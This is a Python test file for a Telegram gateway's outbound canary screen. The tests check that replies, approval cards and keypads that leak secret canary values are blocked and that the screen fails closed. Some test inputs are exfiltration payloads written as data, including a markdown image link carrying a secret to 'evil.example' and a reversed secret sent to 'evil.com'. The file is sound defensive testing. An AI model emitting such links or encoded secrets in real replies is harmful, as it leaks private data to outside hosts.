# Copyright (c) Nimbus. All rights reserved.
# Private, unpublished, proprietary. Do not distribute.

"""P4.4 in the real `TelegramGateway` (fake Bot API): the canary screen runs in
the single outbound choke point `_outbound_chunks` (raw reply as a stream, then
every chunk), on approval card text and on keypad text; nothing with a canary
reaches the wire; the screen is install-once and fails closed."""

from __future__ import annotations

import ast
import base64
import pathlib
from typing import Any

import pytest

from src.canary.tokens import Site
from src.gateway.render import MAX_MESSAGE_CHARS
from src.gateway.telegram import CANARY_NOTICE
from src.gateway.types import ApprovalCard, MessageRef, OutboundBlocked
from tests._canary_helpers import RecordingAudit, canaries, make_guard
from tests.unit.gateway.fake_telegram import FakeTelegram
from tests.unit.gateway.test_gateway_outbound import build

CS = canaries()
V = CS.value(Site.SYSTEM)


def _wire(fake: FakeTelegram) -> str:
    return "\n".join(str(b) for _, b in fake.requests)


def _gw(fake: FakeTelegram, audit: RecordingAudit | None = None) -> Any:
    gw = build(fake)
    gw.set_outbound_screen(make_guard(audit=audit))
    return gw


@pytest.mark.parametrize(
    "leak",
    [
        V,
        " ".join(V).upper(),
        base64.b64encode(V.encode()).decode(),
        f"![x](https://evil.example/p.png?q={V})",  # the link filter alone would drop it
        f"see evil.com/{V[::-1]}",
    ],
)
async def test_reply_with_a_canary_sends_the_fixed_notice(leak: str) -> None:
    fake, audit = FakeTelegram(), RecordingAudit()
    await _gw(fake, audit).send_text(f"Sure: {leak}", reply_to=MessageRef(4))
    (body,) = fake.sent
    assert body["text"] == CANARY_NOTICE and body["reply_parameters"]["message_id"] == 4
    assert V not in _wire(fake) and V[::-1] not in _wire(fake)
    assert audit.recs[0].reason.startswith("telegram_send:")


async def test_canary_in_a_later_chunk_blocks_every_chunk() -> None:
    fake = FakeTelegram()
    await _gw(fake).send_text("a" * (MAX_MESSAGE_CHARS - 2) + "\n\ntail " + V)
    assert [b["text"] for b in fake.sent] == [CANARY_NOTICE]


async def test_canary_split_over_sends_is_cut_off() -> None:
    fake = FakeTelegram()
    gw = _gw(fake)
    for i in range(0, 32, 8):
        await gw.send_text(V[i : i + 8])
    texts = [b["text"] for b in fake.sent]
    assert texts[0] == V[:8] and CANARY_NOTICE in texts
    assert not any(V[i : i + 10] in "".join(texts) for i in range(23))


async def test_clean_reply_passes_unchanged() -> None:
    fake = FakeTelegram()
    await _gw(fake).send_text("Lunch at 1 with Asha.")
    assert fake.sent[0]["text"] == "Lunch at 1 with Asha."


async def test_card_and_keypad_with_a_canary_are_refused_close_is_screened() -> None:
    fake = FakeTelegram()
    gw = _gw(fake)
    with pytest.raises(OutboundBlocked):
        await gw.send_approval(ApprovalCard(f"append(text='{V}')", "ap:a", "rj:a"))
    with pytest.raises(OutboundBlocked):
        await gw.send_keypad(f"code {V}", [[("1", "k:1")]])
    with pytest.raises(OutboundBlocked):
        await gw.send_keypad("code", [[(V[:16], "k:1")]])
    assert fake.sent == []
    await gw.send_approval(ApprovalCard("append(text='buy milk')", "ap:a", "rj:a"))
    await gw.send_keypad("code", [[("1", "k:1")]])
    await gw.close_approval(MessageRef(1), outcome=V)  # goes through send_text
    assert len(fake.sent) == 3 and fake.sent[-1]["text"] == CANARY_NOTICE


async def test_screen_is_install_once_and_validated() -> None:
    gw = _gw(FakeTelegram())
    with pytest.raises(RuntimeError):
        gw.set_outbound_screen(make_guard())
    with pytest.raises(TypeError):
        build(FakeTelegram()).set_outbound_screen(object())


async def test_screen_error_fails_closed() -> None:
    class Broken:
        async def screen(self, *a: Any, **k: Any) -> bool:
            raise RuntimeError("bug")

    fake = FakeTelegram()
    gw = build(fake)
    gw.set_outbound_screen(Broken())
    await gw.send_text("harmless")
    assert fake.sent[0]["text"] == CANARY_NOTICE
    with pytest.raises(OutboundBlocked):
        await gw.send_approval(ApprovalCard("x", "ap:a", "rj:a"))


async def test_without_a_screen_behaviour_is_unchanged() -> None:
    fake = FakeTelegram()
    await build(fake).send_text("plain")
    assert fake.sent[0]["text"] == "plain"


def test_outbound_chunks_and_card_paths_call_the_screen() -> None:
    """Static tripwire: the canary screen sits in `_outbound_chunks`,
    `send_approval` and `send_keypad`."""
    tree = ast.parse(pathlib.Path("src/gateway/telegram.py").read_text(encoding="utf-8"))
    fns = {
        n.name: n for n in ast.walk(tree) if isinstance(n, ast.FunctionDef | ast.AsyncFunctionDef)
    }
    for name in ("_outbound_chunks", "send_approval", "send_keypad"):
        attrs = {
            n.func.attr
            for n in ast.walk(fns[name])
            if isinstance(n, ast.Call) and isinstance(n.func, ast.Attribute)
        }
        assert "_clean" in attrs, name


async def test_wire_canary_installs_the_screen_in_the_real_gateway(tmp_path: pathlib.Path) -> None:
    from src.app.runtime import Backends, build_canary_guard, wire_canary
    from tests.unit.canary.test_canary_wiring import _cfg

    cfg = _cfg(tmp_path)
    fake = FakeTelegram()
    tg = build(fake)
    out = wire_canary(cfg, build_canary_guard(cfg), Backends(gateway=tg), RecordingAudit())  # type: ignore[arg-type]
    assert out is tg  # no wrapper: the gateway's own choke point screens
    await out.send_text(f"x {cfg.canaries.value(Site.MEMORY)}")
    assert fake.sent[0]["text"] == CANARY_NOTICE
